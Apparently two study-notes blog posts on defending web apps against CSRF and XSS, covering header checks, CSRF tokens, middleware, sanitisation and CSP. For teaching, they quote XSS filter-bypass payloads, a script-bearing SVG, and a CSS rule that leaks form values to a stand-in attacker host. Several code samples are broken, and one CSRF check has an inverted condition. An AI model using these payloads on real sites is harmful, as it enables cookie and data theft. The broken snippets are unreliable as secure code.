  <div class="article-meta">
    <a href="/2020/09/18/Defending%20Against%20CSRF%20Attacks/" class="article-date">
  <time datetime="2020-09-18T01:38:28.065Z" itemprop="datePublished">2020-09-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/18/Defending%20Against%20CSRF%20Attacks/">Defending Against CSRF</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <a id="more"></a>
<blockquote>
<p>In Part II we built Cross-Site Request Forgery (CSRF) attacks that took advantage of a<br>user’s authenticated session in order to make requests on their behalf. We built CSRF<br>attacks with <a></a> links, via <img></img> tags, and even via HTTP POST using<br>web forms. We saw how effective and dangerous CSRF-style attacks are against an<br>application, because they function at both an elevated privilege level and often are<br>undetectable by the authenticated user.</p>
</blockquote>
<p>##Header Verification<br>checking the origin of the request<br>in the world of HTTP– two headers we are inerested in–<strong><em>referer and origin</em></strong><br>== they cannot be modified programmatically with js in all major browsers.</p>
<p><strong><em>Origin header</em></strong><br>    The origin header is only sent on HTTP POST requests. indicates where a request originated from. also present on HTTP requests, in addition to HTTP requests. An origin header looks like:<br>    <strong><em>Origin: <a target="_blank" rel="noopener" href="https://www.mega-bank.com:80/">https://www.mega-bank.com:80</a></em></strong></p>
<p>Referer header<br>  The referer header is set on all requests, and also indicates where a request originated from. when referering link has the attribute <strong><em>rel=noreferer</em></strong> set.A referer header looks like: Referer:<a target="_blank" rel="noopener" href="https://www.mega-bank.com:80/">https://www.mega-bank.com:80</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> transferFunds = <span class="built_in">require</span>(<span class="string">&#x27;../operations/transferFunds&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;../util/session&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> validLocations = [</span><br><span class="line">    <span class="string">&#x27;https://www.mega-bank.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https://api.mega-bank.com&#x27;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">const</span> validateHeadersAgainstCSRF = <span class="function"><span class="keyword">function</span>(<span class="params">headers</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> origin = headers.origin</span><br><span class="line">    <span class="keyword">const</span> referer = headers.referer</span><br><span class="line">    <span class="keyword">if</span> (!origin || referer) &#123; <span class="keyword">return</span> <span class="literal">false</span> &#125;</span><br><span class="line">    <span class="keyword">if</span> (!validLocations.includes(origin) || </span><br><span class="line">        !validLocations.includes(referer))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> ture</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cosnt transfer = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!session.isAuthenticated)&#123; <span class="keyword">return</span> res.sendStatus(<span class="number">401</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span> (!validateHeadersAgainstCSRF(req, headers)&#123; <span class="keyword">return</span> res.sendStatus(<span class="number">401</span>)&#125;)</span><br><span class="line">    <span class="keyword">return</span> transferFunds(session.currentUser, req.query.to_user, req.quer.amount)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module</span>.exports = transfer</span><br></pre></td></tr></table></figure>


<blockquote>
<p>check both headers == referer origin<br>first line of defense<br>Should<br>an attacker get an XSS on a whitelisted origin of yours, they can initiate the attack<br>from your own origin, appearing to come from your own servers as a legitimate<br>request.</p>
</blockquote>
<p>#CSRF Tokens<br>anti-CSRF token<br>At its core, CSRF token defense works like this:</p>
<ol>
<li>Your web server sends a special token to the client. This token is generated cryp‐<br>tographically with a very low collision algorithm, which means that the odds of<br>getting two identical tokens are exceedingly rare. The token can be regenerated<br>as often as per request, but generally is generated per session.</li>
<li>Each request from your web application now sends the token back with it; this<br>should be sent back in forms as well as AJAX requests. When the request gets to<br>the server, the token is verified to make sure it is live (not expired), authentic,<br>and has not been manipulated. If verification fails, the request is logged and fails<br>as well.<br>CSRF Tokens | 249</li>
<li>As a result of requests requiring a valid CSRF token, which is unique per session<br>and unique to each user, CSRF attacks originating from other origins become<br>extremely difficult to pull off. Not only would the attacker need a live and up-todate CSRF token, but they would also now need to target a specific user versus a<br>large number of users. Furthermore, with token expiration compromised, CSRF<br>tokens can be dead by the time a user clicks a malicious link—a beneficial side<br>effect of CSRF tokens as a defensive strategy.</li>
</ol>
<p>#stateless CSRF Tokens</p>
<p>Much like stateless authentication tokens, a stateless CSRF token should consist of the<br>following:<br>• A unique identifier of the user the token belongs to<br>• A timestamp (which can be used for expiration)<br>• A cryptographic nonce whose key only exists on the server<br>Combining these elements nets you a CSRF token that is not only practical but also<br>consumes fewer server resources than the stateful alternative, as managing sessions<br>does not scale well compared to a sessionless alternative.</p>
<p>#Anti-CSRF Coding  Best Pratices<br>Several of the most effective methods are:</p>
<ul>
<li>Refactoring to stateless GET requests</li>
<li>Implementation of application-wide CSRF defenses</li>
<li>Introduction of request-checking middleware</li>
</ul>
<p>#Stateless GET Requests</p>
<blockquote>
<p>Because the most common and easily distributable CSRF attacks come via HTTP<br>GET requests, it is important to correctly structure our API calls to mitigate this risk.<br>HTTP GET requests should not store or modify any server-side state. Doing so leaves<br>future GET requests or modifications to GET requests open to potential CSRF<br>vulnerabilities.</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// GET</span></span><br><span class="line"><span class="keyword">const</span> user = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">getUserById(req.query.id).then(<span class="function">(<span class="params">user</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (req.query.updates) &#123; user.update(req.updates); &#125;</span><br><span class="line"> <span class="keyword">return</span> res.json(user);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// GET</span></span><br><span class="line"><span class="keyword">const</span> getUser = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">getUserById(req.query.id).then(<span class="function">(<span class="params">user</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> res.json(user);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// POST</span></span><br><span class="line"><span class="keyword">const</span> updateUser = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"> getUserById(req.query.id).then(<span class="function">(<span class="params">user</span>) =&gt;</span> &#123;</span><br><span class="line"> user.update(req.updates).then(<span class="function">(<span class="params">updated</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (!updated) &#123; <span class="keyword">return</span> res.sendStatus(<span class="number">400</span>); &#125;</span><br><span class="line"> <span class="keyword">return</span> res.sendStatus(<span class="number">200</span>);</span><br><span class="line"> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>The first API combines the two operations into a single request, with an optional<br>update. The second API splits retrieving and updating users into a GET and POST<br>request, respectively.<br>The first API can be taken advantage of by CSRF in any HTTP GET (e.g., a link or<br>image: https://<url>/user?user=123&amp;updates=email:hacker). The second API,<br>while still an HTTP POST and potentially vulnerable to more advanced CSRF, cannot<br>be taken advantage of by links, images, or other HTTP GET-style CSRF attacks.<br>This seems like a simple architecture flaw (modifying state in HTTP GET requests),<br>and in all honesty it is. But the key point here applies to any and all GET requests that<br>could potentially modify server-side application state—don’t do it. HTTP GET<br>requests are at risk by default; the nature of the web makes them much more vulnera‐<br>ble to CSRF attacks, and you should avoid them for stateful operations.<br>#Application-Wide CSRF Mitigation</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Let’s take a look at some middleware that accomplishes just <span class="built_in">this</span>:</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;../util/crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> dateTime = <span class="built_in">require</span>(<span class="string">&#x27;../util/dateTime&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;../util/session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> logger = <span class="built_in">require</span>(<span class="string">&#x27;../util/logger&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> validLocations = [</span><br><span class="line"><span class="string">&#x27;https://www.mega-bank.com&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;https://api.mega-bank.com&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;https://portal.mega-bank.com&#x27;</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">const</span> validateHeaders = <span class="function"><span class="keyword">function</span>(<span class="params">headers, method</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">const</span> origin = headers.origin;</span><br><span class="line"> <span class="keyword">const</span> referer = headers.referer;</span><br><span class="line"> <span class="keyword">let</span> isValid = <span class="literal">false</span>;</span><br><span class="line"> <span class="keyword">if</span> (method === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line"> isValid = validLocations.includes(referer) &amp;&amp; validLocations.includes(origin);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> isValid = validLocations.includes(referer);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> isValid;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> validateCSRFToken = <span class="function"><span class="keyword">function</span>(<span class="params">token, user</span>) </span>&#123;</span><br><span class="line"> <span class="comment">// get data from CSRF token</span></span><br><span class="line"> <span class="keyword">const</span> text_token = crypto.decrypt(token);</span><br><span class="line"> <span class="keyword">const</span> user_id = text_token.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line"> <span class="keyword">const</span> date = text_token.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>];</span><br><span class="line"> <span class="keyword">const</span> nonce = text_token.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">2</span>];</span><br><span class="line"> <span class="comment">// check validity of data</span></span><br><span class="line"> <span class="keyword">let</span> validUser = <span class="literal">false</span>;</span><br><span class="line"> <span class="keyword">let</span> validDate = <span class="literal">false</span>;</span><br><span class="line"> <span class="keyword">let</span> validNonce = <span class="literal">false</span>;</span><br><span class="line"><span class="number">252</span> | Chapter <span class="number">23</span>: Defending Against CSRF Attacks</span><br><span class="line"> <span class="keyword">if</span> (user_id === user.id) &#123; validUser = <span class="literal">true</span>; &#125;</span><br><span class="line"> <span class="keyword">if</span> (dateTime.lessThan(<span class="number">1</span>, <span class="string">&#x27;week&#x27;</span>, date)) &#123; validDate = <span class="literal">true</span>; &#125;</span><br><span class="line"> <span class="keyword">if</span> (crypto.validateNonce(user_id, date, nonce)) &#123; validNonce = <span class="literal">true</span>; &#125;</span><br><span class="line"> <span class="keyword">return</span> validUser &amp;&amp; validDate &amp;&amp; validNonce;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> CSRFShield = <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!validateHeaders(req.headers, req.method) ||</span><br><span class="line"> !validateCSRFToken(req.csrf, session.currentUser) &#123;</span><br><span class="line"> logger.log(req);</span><br><span class="line"> <span class="keyword">return</span> res.sendStatus(<span class="number">401</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">return</span> next();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>The middleware simply verifies that the origin<br>and/or referrer headers are correct, and then ensures that the CSRF token is valid. It<br>returns an error before any other logic is called if either fail; otherwise it moves on to<br>the next middleware and allows the application to continue execution unaltered.<br>Because this middleware relies on a client consistently passing a CSRF token to the<br>server on each request, it would be optimal to replicate such automation on the client<br>as well. This can be done with a number of techniques. For example, you could use<br>the proxy pattern to overwrite the XMLHttpRequest default behavior to always include<br>the token.<br>Alternatively, you could use a more simple approach that would rely on building a<br>library for generating requests that would simply wrap the XMLHttpRequest and<br>inject the correct token, depending on the HTTP verb.<br>#Summary<br> Further, CSRF mitigations should consider<br>validating headers and adding CSRF tokens to each of your requests.</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/09/18/Defending%20Against%20CSRF%20Attacks/" data-id="ckfah5pjj000390th3mkg0jzl" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Defending Against XSS" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/17/Defending%20Against%20XSS/" class="article-date">
  <time datetime="2020-09-17T11:10:15.752Z" itemprop="datePublished">2020-09-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/17/Defending%20Against%20XSS/">Defending Against XXS</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <a id="more"></a>
<p>#Anti-XSS Coding Best Practices<br>**<em>Dont’ allow any user-supplied data to be passwd into the DOM-except as strings**</em></p>
<blockquote>
<p>Such a rule is not applicable to all applications, as many applications have features<br>that incorporate users to DOM data transfer. In this case, we can make this rule more<br>specific: “never allow any unsanitized user-supplied data to be passed into the DOM.”</p>
</blockquote>
<p>perfrom checks a number of ways on both the client and the server.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span>  isString = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> x === <span class="string">&#x27;string&#x27;</span> || x <span class="keyword">instanceof</span> <span class="built_in">String</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>unfortunately, this check will fail when checking numbers–an edge case that can be annoying to deal with beacause numbers are also safe fro injection into the DOM.</p>
</blockquote>
<p>***We can categorize strings and numbers into “string-like” objects. evaluate a “string-like” obj using a relatively unknown side effect of JSON.parse():</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isStringLike = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(<span class="built_in">JSON</span>.parse(x)) === x;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;not string-like&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong><em>JSON.parse()</em></strong> — built into js — attempts to convert text to JSON object. Numbers and strings will pass the check, but complex objects such as fucntions will fail as they do not fit a format compatible with JSON</p>
</blockquote>
<p>Finally, we must ensure that even when we have a string object or string-like object,<br>the DOM interprets it as string/string-like. This is because string objects, while not<br>DOM themselves, can still be interpreted as DOM or converted into DOM, which we<br>want to avoid.</p>
<blockquote>
<p>Generally, we inject user data into the DOM using innerText or innerHTML. When<br>HTML tags are not needed, innerText is much safer because it attempts to sanitize<br>anything that looks like an HTML tag by representing it as a string<br>####Less safe:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> userString = <span class="string">&#x27;&lt;strong&gt;cakeit&lt;/strong&gt;;</span></span><br><span class="line">const div = document.querySelector(&#x27;#userComment&#x27;)</span><br><span class="line">div.innerHTML = userString <span class="comment">// tags interpreted as DOM</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> userString = <span class="string">&#x27;&lt;strong&gt;cakeit&lt;/strong&gt;;</span></span><br><span class="line">const div = document.querySelector(&#x27;#userComment&#x27;)</span><br><span class="line">div.innerText = userString; <span class="comment">// tags interpreted as  strings </span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>This is because innerText performs its<br>own sanitization in order to view HTML tags as strings, whereas innerHTML does not<br>perform such sanitization and will interpret HTML tags as HTML tags when loaded<br>into the DOM. The sanitized innerText is not failsafe, as each browser has its own<br>variations on the exact implementation, and with a quick internet search you can find<br>a variety of current and historical ways to bypass the sanitization<br>#Sanitizing User Input<br>Sometimes you will not be able to rely on a useful tool like innerText to aid you in<br>sanitizing user input. This is particularly common when you need to allow certain<br>HTML tags, but not others</p>
</blockquote>
<hr>
<p>+For example, you may want to allow <strong><strong><br>and <i></i> but not <script></script>. In these cases, you want to make sure you<br>extensively sanitize the user-submitted data prior to injecting it into the DOM<br>===============================</p>
<p>For example, let’s assume your sanitizer blocks single and double quotes as well as<br>script tags. You could still run into this issue:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(document.cookie)&quot;</span>&gt;</span>clck me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Using this method with other DOM methods, you can even bypass the filtration on<br>single and double quote:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(String.fromCharCode(88,83,83))&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>would alert “XSS” as the string has been derived rom the <strong><em>String.fromCharCode() API</em></strong></p>
</blockquote>
<p>Stay away from the following APIs when possible:</p>
<ul>
<li>element.innerHTM<code>L / </code>element.outerHTML</li>
<li>Blob</li>
<li>SVG</li>
<li>document.write / document.writeln</li>
<li>DOMParser.parseFromString</li>
<li>document.implementation<br>#DOMParser Sink<br>allow develop to easily generate DOM or script from text<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> parser = <span class="keyword">new</span> DOMParser();</span><br><span class="line"><span class="keyword">const</span> html = parser.parseFromString(<span class="string">&#x27;&lt;script&gt;alert(&quot;hi&quot;);&lt;/script&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>This API loads the cotents of the string in <strong><em>parseFromString</em></strong> into DOM nodes reflecting the structure of the input string.This could be used for filling a page with<br>structured DOM from a server, which may be beneficial when you want to turn a<br>complex DOM string into properly organized DOM nodes.</p>
</blockquote>
</li>
</ul>
<p>However, manually creating each node with document.createElement() and organ‐<br>izing them using document.appendChild(child) offers significantly less risk. You<br>now are controlling the structure and tag names of the DOM while the payload only<br>controls the content.<br>###SVG Sink<br>sinificant risk— store arbitrary data and yet still are capable of code execution:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;http://www.w3.org/Graphics/SBG/1.1/DTD/sbg11.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">&quot;258&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;250&quot;</span> <span class="attr">r</span>=<span class="string">&quot;50&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;test&#x27;</span>):</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Scalable Vecotr Graphics — SVG– wonderful for displaying images consisitently across a wide number of devices— reliance on the XML spec that allow script execution, they are much riskier </p>
<blockquote>
<p>We saw in Part II that we could use the image tag <img> to launch CSRF attacks since<br>the <img> tag supports a href. SVGs can launch any type of JavaScript onload, making<br>them significantly more dangerous.<br>####Blob Sink</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create blob with script reference </span></span><br><span class="line"><span class="keyword">const</span> blog = <span class="keyword">new</span> Blob([script], &#123;<span class="attr">type</span>: <span class="string">&#x27;text/javascript&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">const</span> url = URL.creteObjectURL(blob)</span><br><span class="line"><span class="comment">// inject script into page for execution</span></span><br><span class="line"><span class="keyword">const</span> script  = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">script.src = url</span><br><span class="line"></span><br><span class="line"><span class="comment">// load the script into the page </span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script)</span><br></pre></td></tr></table></figure>

<p>Furthermore, blobs can store data in many formats; base64 as a blob is simply a con‐<br>tainer for arbitrary data. As a result, it is best to leave blobs out of your code if possi‐<br>ble, especially if any of the blob instantiation process involves user data.<br>####Sanitizing Hyperlinks</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=<span class="string">&quot;goToLink()&quot;</span>&gt;click me&lt;/button&gt;</span><br><span class="line"><span class="keyword">const</span> userLink = <span class="string">&quot;&lt;script&gt;alert(&#x27;hi&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> goToLink = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="built_in">window</span>.location.href = <span class="string">`https://mywebsite.com/<span class="subst">$&#123;userLink&#125;</span>`</span>;</span><br><span class="line"> <span class="comment">// goes to: https://my-website.com/&lt;script&gt;alert(&#x27;hi&#x27;)&lt;/script&gt;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> userLink = <span class="string">&quot;&lt;script&gt;alert(&#x27;hi&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> goToLink = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">const</span> dummy = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"> dummy.href = userLink;</span><br><span class="line"> <span class="built_in">window</span>.location.href = <span class="string">`https://mywebsite.com/<span class="subst">$&#123;dummy.a&#125;</span>`</span>;</span><br><span class="line"> <span class="comment">// goes to: https://my-website.com/%3Cstrong%3Etest%3C/strong</span></span><br><span class="line">&#125;;</span><br><span class="line">goToLink();</span><br></pre></td></tr></table></figure>

<p>encodeURIComponent(‘<strong>test&lt;/strong’); // %3Cstrong%3Etest%3C%2Fstrong%3E</p>
<blockquote>
<p>Note that encodeURIComponent() cannot be used for an entire URL string as it will<br>no longer conform to the HTTP spec because scheme as the origin (scheme + :// +<br>hostname + : + port) cannot be interpreted by browsers when encoded (it becomes<br>a different origin).</p>
</blockquote>
<p>####HTML Entity Encoding<br>The “big five” for entity encoding are shown</p>
<table>
<thead>
<tr>
<th>Charcter</th>
<th>Entity encoded</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;</td>
<td>&amp; + amp;</td>
</tr>
<tr>
<td>&lt;</td>
<td>&amp; + lt;</td>
</tr>
</tbody></table>
<blockquote>
<pre><code>      |   &amp; + gt;</code></pre>
<p>“           |   &amp; + #034;<br>‘           |   &amp; + #039;</p>
</blockquote>
<p>Entity encoding will NOT protect any content injected inside of a <script></script> tag, CSS, or a URL. It will only protect against content injected into a <div></div> or <div></div>-like DOM node. This is because it is possible to create a<br>string of HTML entity encoded strings in such an order that part of the string is still<br>valid JavaScript.<br>####CSS</p>
<p> Any time an image from another origin is<br>loaded into the page, a GET request is issued—be it from HTML, JS, or CSS.<br>In CSS we can use the background:url attribute to load an image from a provided<br>domain. Because this is an HTTP GET, it can also include query params.</p>
<p>CSS also allows for selective styling based on the condition of a form. This means we<br>can change the background of an element in the DOM based on the state of a form<br>field:</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#income</span><span class="selector-attr">[value=<span class="string">&quot;&gt;100k&quot;</span>]</span> &#123;</span><br><span class="line"> <span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;https://www.hacker.com/incomes?amount=gte100k&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>As you can see, when the income button is set to &gt;100k, the CSS background changes,<br>initiating a GET request and leaking the form data to another website.</p>
<p>In conclusion, CSS attacks can be avoided by:<br>[easy]<br>Disallowing user-uploaded CSS<br>[medium]<br>Allowing only specific fields to be modified by the user and generating the<br>custom stylesheet yourself on the server using these fields<br>[hard]<br>Sanitizing any HTTP-initiating CSS attributes (background:url)</p>
<p>####Content Security Policy for XSS Prevention</p>
<blockquote>
<p>CSP protections come in several forms, including what external scripts can be loaded,<br>where they can be loaded, and what DOM APIs are allowed to execute the script.</p>
</blockquote>
<p>The “self” in the CSP declaration simply refers to the current URL from which the<br>policy is loaded and the protected document is being served. As such the CSP script<br>source is actually used for defining multiple URLs: safe URLs to load scripts from,<br>and the current URL.</p>
